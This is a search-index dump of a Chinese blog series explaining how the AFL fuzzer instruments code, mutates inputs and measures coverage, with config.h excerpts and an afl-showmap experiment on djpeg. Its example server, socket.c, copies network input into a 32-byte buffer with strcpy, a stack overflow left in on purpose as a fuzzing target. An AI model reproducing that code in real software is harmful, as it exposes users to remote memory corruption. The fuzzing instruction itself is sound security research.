2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"2. 无源码 无源码情况下，AFL使用QEMU进行二进制插桩，具体插桩原理待补充。 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"三、变异策略 AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下： bitflip，按位翻转，1变为0，0变为1 arithmetic，整数加/减算术运算 interest，把一些特殊内容替换到原文件中 dictionary，把自动生成或用户提供的token替换/插入到原文件中 havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异 splice，中文意思是“拼接”，此阶段会将两个文件拼接起来得到一个新的文件 其中，前四项 bitflip, arithmetic, interest, dictionary 是非 dumb mode（-d）和主 fuzzer（-M）会进行的操作，由于其变异方式没有随机性，所以也称为 deterministic fuzzing ；havoc 和 splice 则存在随机性，是所有状况的 fuzzer（是否 dumb mode、主从 fuzzer）都会执行的变异。 以下将对这些变异类型进行具体介绍。 ###（1） bitflip 拿到一个原始文件，首先进行的就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为： bitflip 1/1， 每次翻转1个bit，按照每1个bit的步长从头开始 bitflip 2/1， 每次翻转相邻的2个bit，按照每1个bit的步长从头开始 bitflip 4/1， 每次翻转相邻的4个bit，按照每1个bit的步长从头开始 bitflip 8/8， 每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转 bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转 bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转 在上述过程中，AFL巧妙地嵌入了一些对文件格式的启发式判断，以图尽可能多得获取文件信息。 自动检测token 在进行 bitflip 1/1变异时，对于每个 byte 的最低位( least significant bit )翻转还进行了额外的处理：如果连续多个 bytes 的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的 bytes 判断是一条token。 例如，PNG文件中用IHDR作为起始块的标识，那么就会存在类似于以下的内容： ........IHDR........ 当翻转到字符I的最高位时，因为IHDR被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，IHDR标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：IHDR，并将其记录下来为后面的变异提供备选。 AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在config.h中通过宏定义了限制： /* Length limits for auto-detected dictionary tokens: */ #define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */ #define USE_AUTO_EXTRAS 10 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) 对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改 MAX_AUTO_EXTRA 为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。 生成effector map 在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。 具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。 这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。 由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。 不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关： /* Minimum input file length at which the effector logic kicks in: */ #define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */ #define EFF_MAX_PERC 90 即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。 ###（2） arithmetic 在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段： arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异 arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异 arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异 加减变异的上限，在config.h中的宏ARITH_MAX定义，默认为35。所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。 此外，AFL还会智能地跳过某些arithmetic变异。第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。 ###（3） interest 下一个阶段是interest，具体可分为： interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换 interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换 interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换 而用于替换的”interesting values”，是AFL预设的一些比较特殊的数： static s8 interesting_8[] = { INTERESTING_8 }; static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 }; static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 }; 这些数的定义在config.h文件中： /* List of interesting values to use in fuzzing. */ #define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */ \\ -1, /* */ \\ 0, /* */ \\ 1, /* */ \\ 16, /* One-off with common buffer size */ \\ 32, /* One-off with common buffer size */ \\ 64, /* One","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"效果分析 参考 https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html 中的测试方法，同样以 djpeg 为目标，最初的样本集只有一个文本 test，采用二进制插桩的方式进行fuzz，1个主节点以及3个从节点同时进行，测试最终是否能fuzz出一个合法的图片文件。 fuzz后的样本集合如下： 使用 afl-showmap 对所有样本进行分析，编写脚本如下： #!/bin/bash path=$1 dpath=$2 rm -rf $2/* for file in $(ls $1) do echo -e '\\n'$file afl-showmap -o $2/$file -Q -- /usr/bin/djpeg $1/$file echo -e '-------------------------------------\\n' done 第一个参数为样本集合目录，第二个参数为输出目录，假设脚本名为 djpeg.sh ，样本目录为 in ，输出目录为 map ./djpeg.sh in map 脚本的执行结果可在 分析/djpeg_sh脚本输出结果.txt 中查看，以下只展示部分： id:000000,orig:1 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Not a JPEG file: starts with 0x74 0x65 -- Program output ends -- [+] Captured 50 tuples in 'map/id:000000,orig:1'. ------------------------------------- id:000001,src:000000,op:havoc,rep:64,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 2 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000001,src:000000,op:havoc,rep:64,+cov'. ------------------------------------- id:000005,src:000000+000001,op:splice,rep:64 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 6 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000005,src:000000+000001,op:splice,rep:64'. ------------------------------------- id:000021,src:000011,op:flip32,pos:2,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 59 tuples in 'map/id:000021,src:000011,op:flip32,pos:2,+cov'. ------------------------------------- id:000026,src:000021,op:havoc,rep:2 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 60 tuples in 'map/id:000026,src:000021,op:havoc,rep:2'. ------------------------------------- 可以看到上面样本id为21和26的输出结果相同，但是执行路径不同，可以使用 diff 指令进行路径对比： diff -Nu map/id\\:000021\\,src\\:000011\\,op\\:flip32\\,pos\\:2\\,+cov map/id\\:000026\\,src\\:000021\\,op\\:havoc\\,rep\\:2 结果如下： --- map/id:000021,src:000011,op:flip32,pos:2,+cov 2019-12-03 06:38:42.236000000 +0000 +++ map/id:000026,src:000021,op:havoc,rep:2 2019-12-03 06:38:42.388000000 +0000 @@ -1,20 +1,21 @@ 003224:1 004793:1 005209:1 -005993:1 +005993:2 006601:1 007073:1 008498:1 008874:1 -010130:1 +010130:2 010146:1 010282:1 -013459:1 +013459:2 +014971:1 017564:1 018892:1 019132:1 019148:1 -019172:1 +019172:2 019188:1 019236:1 019804:1 @@ -33,18 +34,18 @@ 032872:1 033112:1 037297:1 -037433:1 +037433:2 037817:1 039585:1 -039641:2 -043450:1 +039641:4 +043450:2 043562:1 044194:1 044818:1 045483:1 046955:1 047603:1 -048251:1 +048251:2 051300:1 052444:1 053124:1 从最初的只有文本内容“test”的样本，afl确实已经发现了很多其它路径，但是在我的测试结果中还是没有fuzz出正常的图片文件，从输出结果上看样本id为21和26算是比较接近，没有报明显错误。 Premature end of JPEG file JPEG datastream contains no image ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"参考链接 https://github.com/google/AFL https://www.secpulse.com/archives/71903.html https://www.freebuf.com/articles/system/191536.html http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html https://paper.seebug.org/841/ https://paper.seebug.org/496/#part-2afl https://rk700.github.io/2017/12/28/afl-internals/ https://rk700.github.io/2018/01/04/afl-mutations/ https://rk700.github.io/2018/02/02/afl-enhancement/ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:3:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"AFL二三事系列 note 2","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"本文是AFL系列第二篇，主要介绍AFL的一些基本原理。 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:0:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"一、代码覆盖率 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"1. 计算方法 代码覆盖率的计量单位，通常有3种： 函数（Fuction-Level） 基本块（BasicBlock-Level） 边界（Edge-Level） （1）函数（Fuction-Level） 这个很容易理解，就是代码执行时调用到哪些函数，但是函数里面的具体代码行却不作统计，相对比较粗糙但高效的统计方式。 所以，通常的统计方式是用基本块，简称BB。 （2）基本块（BasicBlock-Level） 基本块，直接看下图就很容易理解了。 IDA中每一块代码就代表着一个基本块，就是以指令跳转为作划分界限的。 （3）边界（Edge-Level） edge本身就涵盖了基本块部分，唯一的差别是edge多记录了一些执行边界的信息。比如示例代码： 在IDA中可以看到A、B、C这3个基本块，但当a为假时，程序就会从A执行到C。 前面基本块的方式就无法确切地知道是否曾从A执行到C，尤其是该段代码被多次执行的情况，就更无法知道，这时edge覆盖方式就出现了。 edge会在A跟C之间建立虚拟块D，通过判断D是否执行过，来确认是否曾从A执行到C，这种方式也会比较消耗性能。 以上内容摘自泉哥博客，原文链接https://riusksk.me/2018/07/29/honggfuzz%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF1/ AFL采用的是第三种方式。 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"2. AFL中两种代码覆盖率计算方式 AFL支持两种代码覆盖率计算方式，有源码的情况下，在源代码编译时进行插桩，无源码的情况下，使用QEMU进行二进制插桩。下一章节会分别详细讲解这两种情况使用的插桩技术。 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:1:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"二、插桩 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"1. 有源码 我们以如下代码为例进行说明，文件名为 socket.c #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e #include\u003cunistd.h\u003e #include\u003csys/socket.h\u003e #include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } 可以进行源码插桩的指令有 afl-gcc、afl-g++、afl-clang、afl-clang++ ( afl-clang-fast 和 afl-clang-fast++ 暂不讨论)，通过查看这些文件的具体属性，可以发现后三者都是 afl-gcc 的软链接，其实都是同一个二进制文件： 通过分析 afl-gcc.c 中的代码可以发现， afl-gcc 就是在原有的编译指令上增加一些编译选项然后调用对应的系统调用指令： 为了方便查看每次源码编译时的编译选项，可以对 afl-gcc.c 进行修改，在 main() 函数中调用 execvp() 之前添加如下代码，打印出实际执行的编译指令： //print command for(int i = 0; i \u003c cc_par_cnt; i++){ printf(\"%s \", cc_params[i]); } printf(\"\\n\"); 其中数组 cc_params 存放着编译指令和选项，整数 cc_par_cnt 存放数组有效值，修改完成后对AFL重新进行编译即可。 （afl-clang-fast 和 afl-clang-fast++ 对应的源码文件为 llvm_mode/afl-clang-fast.c ，修改方法相同） 使用 afl-gcc 对上面代码进行编译 afl-gcc -o socket_afl socket.c 可以看到实际执行的编译指令为 gcc -o socket socket.c -B /usr/local/lib/afl -g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 ，其中 -B \u003cdirectory\u003e 选项用于将添加到编译器的搜索路径，-g 选项生成调试信息，-O3 优化生成代码，-funroll-loops 选项展开循环的迭代次数可以在编译时或进入循环时确定，剩余两个为AFL使用的选项。（gcc的选项可以参考此链接 https://gcc.gnu.org/onlinedocs/gcc-4.4.2/gcc/Optimize-Options.html） 如果了解编译过程，那么就知道把源代码编译成二进制，主要是经过”源代码”-\u003e”汇编代码”-\u003e”二进制”这样的过程。而将汇编代码编译成为二进制的工具，即为汇编器assembler。Linux系统下的常用汇编器是as。不过，编译完成AFL后，在其目录下也会存在一个as文件，并作为符号链接指向afl-as。所以，如果通过-B选项为gcc设置了搜索路径，那么afl-as便会作为汇编器，执行实际的汇编操作。 所以，AFL的代码插桩，就是在将源文件编译为汇编代码后，通过 afl-as 完成。 afl-as 下面通过对比 gcc 和 afl-gcc 的编译结果进行大致分析。 将 afl-gcc 中添加的 -B、-D__AFL_COMPILER=1、DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 三个选项去掉，调用 gcc gcc -o socket socket.c -g -O3 -funroll-loops 这样就生成了 socket_afl 和 socket 两个文件。 使用 bindiff 对这两个文件中的 main 函数进行对比 上图中右下角部分看起来结构不一样，不过这里是 bindiff 识别bug，多出了一个代码块并且少了一条线，我们可以分别使用 ida 打开这两个文件，查看 main 函数的结构图 这里对 bindiff 误报结果的详细分析就不多说了，这个不是本次的重点。 可以看到 afl 进行源代码插桩时不会改变代码的逻辑结构，也不会增加或减少代码块。 对比看下每个代码块中代码的区别 可以看出，基本每个代码块都被添加了一段相似的汇编代码 在 ida 中将这部分代码拷贝出来，如下： lea rsp, [rsp-98h] mov [rsp+1D0h+var_1D0], rdx mov [rsp+1D0h+var_1C8], rcx mov [rsp+1D0h+var_1C0], n mov rcx, 650Eh call __afl_maybe_log mov n, [rsp+1D0h+var_1C0] mov rcx, [rsp+1D0h+var_1C8] mov rdx, [rsp+1D0h+var_1D0] lea rsp, [rsp+98h] 对比可以发现，不同的代码块只有 mov rcx, 650Eh 这条汇编代码向 rcx 存放的值不同，这个就是随机生成的标识代码块的id，当运行到这部分汇编时 afl 就知道是哪个代码块被执行了。 上述 ida 中的汇编代码原型可以在 afl-as.h 中找到（以64位代码为例）： 上述代码执行的主要功能包括： 保存 rdx、 rcx 、rax 寄存器 将 rcx 的值设置为 fprintf() 函数将要打印的变量内容 调用 __afl_maybe_log 函数 恢复寄存器 在以上的功能中， __afl_maybe_log 是插桩代码所执行的实际内容，后续将详细展开。 可以在 afl-as.c 中查看到该汇编的调用，通过 fprintf() 函数的调用，将格式化字符串添加到汇编文件的相应位置。 这里分析下 R(MAP_SIZE) ，它就是上面汇编代码中将 rcx 设置的值。根据定义， MAP_SIZE 为64K，而对于 R(x) 函数定义如下： 其中 R(MAP_SIZE) 相当于 random() % (1 \u003c\u003c MAP_SIZE_POW2) ，也就是生成随机数，所以标识代码块的id是随机生成的（两次编译生成的代码段id不同）。 上述过程总结起来就是在处理到某个分支需要插入桩代码时， afl-as 会随机生成一个随机数，作为运行时保存在 rcx 中的值。而这个随机数，便是用于标识这个代码块的id。 （备注：因为代码块ID随机的问题，会","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"2. 无源码 无源码情况下，AFL使用QEMU进行二进制插桩，具体插桩原理待补充。 ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:2:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"三、变异策略 AFL维护了一个队列(queue)，每次从这个队列中取出一个文件，对其进行大量变异，并检查运行后是否会引起目标崩溃、发现新路径等结果。变异的主要类型如下： bitflip，按位翻转，1变为0，0变为1 arithmetic，整数加/减算术运算 interest，把一些特殊内容替换到原文件中 dictionary，把自动生成或用户提供的token替换/插入到原文件中 havoc，中文意思是“大破坏”，此阶段会对原文件进行大量变异 splice，中文意思是“拼接”，此阶段会将两个文件拼接起来得到一个新的文件 其中，前四项 bitflip, arithmetic, interest, dictionary 是非 dumb mode（-d）和主 fuzzer（-M）会进行的操作，由于其变异方式没有随机性，所以也称为 deterministic fuzzing ；havoc 和 splice 则存在随机性，是所有状况的 fuzzer（是否 dumb mode、主从 fuzzer）都会执行的变异。 以下将对这些变异类型进行具体介绍。 ###（1） bitflip 拿到一个原始文件，首先进行的就是bitflip，而且还会根据翻转量/步长进行多种不同的翻转，按照顺序依次为： bitflip 1/1， 每次翻转1个bit，按照每1个bit的步长从头开始 bitflip 2/1， 每次翻转相邻的2个bit，按照每1个bit的步长从头开始 bitflip 4/1， 每次翻转相邻的4个bit，按照每1个bit的步长从头开始 bitflip 8/8， 每次翻转相邻的8个bit，按照每8个bit的步长从头开始，即依次对每个byte做翻转 bitflip 16/8，每次翻转相邻的16个bit，按照每8个bit的步长从头开始，即依次对每个word做翻转 bitflip 32/8，每次翻转相邻的32个bit，按照每8个bit的步长从头开始，即依次对每个dword做翻转 在上述过程中，AFL巧妙地嵌入了一些对文件格式的启发式判断，以图尽可能多得获取文件信息。 自动检测token 在进行 bitflip 1/1变异时，对于每个 byte 的最低位( least significant bit )翻转还进行了额外的处理：如果连续多个 bytes 的最低位被翻转后，程序的执行路径都未变化，而且与原始执行路径不一致，那么就把这一段连续的 bytes 判断是一条token。 例如，PNG文件中用IHDR作为起始块的标识，那么就会存在类似于以下的内容： ........IHDR........ 当翻转到字符I的最高位时，因为IHDR被破坏，此时程序的执行路径肯定与处理正常文件的路径是不同的；随后，在翻转接下来3个字符的最高位时，IHDR标识同样被破坏，程序应该会采取同样的执行路径。由此，AFL就判断得到一个可能的token：IHDR，并将其记录下来为后面的变异提供备选。 AFL采取的这种方式是非常巧妙的：就本质而言，这实际上是对每个byte进行修改并检查执行路径；但集成到bitflip后，就不需要再浪费额外的执行资源了。此外，为了控制这样自动生成的token的大小和数量，AFL还在config.h中通过宏定义了限制： /* Length limits for auto-detected dictionary tokens: */ #define MIN_AUTO_EXTRA 3 #define MAX_AUTO_EXTRA 32 /* Maximum number of auto-extracted dictionary tokens to actually use in fuzzing (first value), and to keep in memory as candidates. The latter should be much higher than the former. */ #define USE_AUTO_EXTRAS 10 #define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) 对于一些文件来说，我们已知其格式中出现的token长度不会超过4，那么我们就可以修改 MAX_AUTO_EXTRA 为4并重新编译AFL，以排除一些明显不会是token的情况。遗憾的是，这些设置是通过宏定义来实现，所以不能做到运行时指定，每次修改后必须重新编译AFL。 生成effector map 在进行bitflip 8/8变异时，AFL还生成了一个非常重要的信息：effector map。这个effector map几乎贯穿了整个deterministic fuzzing的始终。 具体地，在对每个byte进行翻转时，如果其造成执行路径与原始路径不一致，就将该byte在effector map中标记为1，即“有效”的，否则标记为0，即“无效”的。 这样做的逻辑是：如果一个byte完全翻转，都无法带来执行路径的变化，那么这个byte很有可能是属于”data”，而非”metadata”（例如size, flag等），对整个fuzzing的意义不大。所以，在随后的一些变异中，会参考effector map，跳过那些“无效”的byte，从而节省了执行资源。 由此，通过极小的开销（没有增加额外的执行次数），AFL又一次对文件格式进行了启发式的判断。看到这里，不得不叹服于AFL实现上的精妙。 不过，在某些情况下并不会检测有效字符。第一种情况就是dumb mode或者从fuzzer，此时文件所有的字符都有可能被变异。第二、第三种情况与文件本身有关： /* Minimum input file length at which the effector logic kicks in: */ #define EFF_MIN_LEN 128 /* Maximum effector density past which everything is just fuzzed unconditionally (%): */ #define EFF_MAX_PERC 90 即默认情况下，如果文件小于128 bytes，那么所有字符都是“有效”的；同样地，如果AFL发现一个文件有超过90%的bytes都是“有效”的，那么也不差那10%了，大笔一挥，干脆把所有字符都划归为“有效”。 ###（2） arithmetic 在bitflip变异全部进行完成后，便进入下一个阶段：arithmetic。与bitflip类似的是，arithmetic根据目标大小的不同，也分为了多个子阶段： arith 8/8，每次对8个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个byte进行整数加减变异 arith 16/8，每次对16个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个word进行整数加减变异 arith 32/8，每次对32个bit进行加减运算，按照每8个bit的步长从头开始，即对文件的每个dword进行整数加减变异 加减变异的上限，在config.h中的宏ARITH_MAX定义，默认为35。所以，对目标整数会进行+1, +2, …, +35, -1, -2, …, -35的变异。特别地，由于整数存在大端序和小端序两种表示方式，AFL会贴心地对这两种整数表示方式都进行变异。 此外，AFL还会智能地跳过某些arithmetic变异。第一种情况就是前面提到的effector map：如果一个整数的所有bytes都被判断为“无效”，那么就跳过对整数的变异。第二种情况是之前bitflip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行。 ###（3） interest 下一个阶段是interest，具体可分为： interest 8/8，每次对8个bit进替换，按照每8个bit的步长从头开始，即对文件的每个byte进行替换 interest 16/8，每次对16个bit进替换，按照每8个bit的步长从头开始，即对文件的每个word进行替换 interest 32/8，每次对32个bit进替换，按照每8个bit的步长从头开始，即对文件的每个dword进行替换 而用于替换的”interesting values”，是AFL预设的一些比较特殊的数： static s8 interesting_8[] = { INTERESTING_8 }; static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 }; static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 }; 这些数的定义在config.h文件中： /* List of interesting values to use in fuzzing. */ #define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */ \\ -1, /* */ \\ 0, /* */ \\ 1, /* */ \\ 16, /* One-off with common buffer size */ \\ 32, /* One-off with common buffer size */ \\ 64, /* One","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"效果分析 参考 https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html 中的测试方法，同样以 djpeg 为目标，最初的样本集只有一个文本 test，采用二进制插桩的方式进行fuzz，1个主节点以及3个从节点同时进行，测试最终是否能fuzz出一个合法的图片文件。 fuzz后的样本集合如下： 使用 afl-showmap 对所有样本进行分析，编写脚本如下： #!/bin/bash path=$1 dpath=$2 rm -rf $2/* for file in $(ls $1) do echo -e '\\n'$file afl-showmap -o $2/$file -Q -- /usr/bin/djpeg $1/$file echo -e '-------------------------------------\\n' done 第一个参数为样本集合目录，第二个参数为输出目录，假设脚本名为 djpeg.sh ，样本目录为 in ，输出目录为 map ./djpeg.sh in map 脚本的执行结果可在 分析/djpeg_sh脚本输出结果.txt 中查看，以下只展示部分： id:000000,orig:1 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Not a JPEG file: starts with 0x74 0x65 -- Program output ends -- [+] Captured 50 tuples in 'map/id:000000,orig:1'. ------------------------------------- id:000001,src:000000,op:havoc,rep:64,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 2 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000001,src:000000,op:havoc,rep:64,+cov'. ------------------------------------- id:000005,src:000000+000001,op:splice,rep:64 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 6 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000005,src:000000+000001,op:splice,rep:64'. ------------------------------------- id:000021,src:000011,op:flip32,pos:2,+cov afl-showmap 2.56b by 